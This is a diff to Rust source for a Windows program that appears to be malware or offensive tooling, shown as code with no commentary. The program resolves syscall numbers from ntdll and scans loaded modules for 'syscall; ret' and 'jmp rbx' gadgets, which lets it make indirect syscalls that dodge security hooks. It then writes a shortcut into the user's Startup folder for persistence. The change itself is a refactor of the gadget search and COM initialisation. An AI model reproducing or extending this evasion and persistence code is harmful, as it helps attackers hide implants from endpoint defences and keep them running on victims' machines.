@@ -12,7 +12,7 @@ use std::ffi::c_void;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
 use windows_sys::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_NORMAL};
 use windows_sys::Win32::System::Com::{
-    CoInitialize, CoCreateInstance, CLSCTX_ALL,
+    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, COINIT_MULTITHREADED,
     IStream, CoTaskMemFree,
 };
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
@@ -171,11 +171,9 @@ fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
 
 fn main() {
     unsafe {
-        let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
-        let k32_name = ['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
-        let kbase_name = ['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, 'b' as u16, 'a' as u16, 's' as u16, 'e' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
-        let w32u_name = ['w' as u16, 'i' as u16, 'n' as u16, '3' as u16, '2' as u16, 'u' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
+        CoInitializeEx(null_mut(), COINIT_MULTITHREADED as u32);
 
+        let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
         if ntdll_base.is_null() { return; }
 
@@ -183,31 +181,24 @@ fn main() {
         let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
         let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");
 
-        let modules: [&[u16]; 4] = [&ntdll_name, &k32_name, &kbase_name, &w32u_name];
+        let mut syscall_gadget: *mut c_void = null_mut();
+        let mut jmp_rbx_gadget: *mut c_void = null_mut();
 
-        let mut syscall_gadget = null_mut();
-        for mod_name in &modules {
-            let base = syscalls::get_module_base(mod_name);
-            if !base.is_null() {
+        syscalls::for_each_module(|base, _name| {
+            if syscall_gadget.is_null() {
                 if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0x0F, 0x05, 0xC3]]) {
                     syscall_gadget = g as *mut c_void;
-                    break;
                 }
             }
-        }
-        if syscall_gadget.is_null() { return; }
-
-        let mut jmp_rbx_gadget = null_mut();
-        for mod_name in &modules {
-            let base = syscalls::get_module_base(mod_name);
-            if !base.is_null() {
+            if jmp_rbx_gadget.is_null() {
                 if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0xFF, 0xE3], &[0x53, 0xC3]]) {
                     jmp_rbx_gadget = g as *mut c_void;
-                    break;
                 }
             }
-        }
-        if jmp_rbx_gadget.is_null() { return; }
+            !syscall_gadget.is_null() && !jmp_rbx_gadget.is_null()
+        });
+
+        if syscall_gadget.is_null() || jmp_rbx_gadget.is_null() { return; }
 
         let mut path_ptr: *mut u16 = null_mut();
         if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr) != S_OK {
@@ -229,8 +220,6 @@ fn main() {
         let unicode_startup = create_unicode_string(&nt_startup_path);
 
         CoTaskMemFree(path_ptr as *const _);
-
-        CoInitialize(null_mut());
 
         let mut shell_link_ptr: *mut c_void = null_mut();
         if CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr) == S_OK {
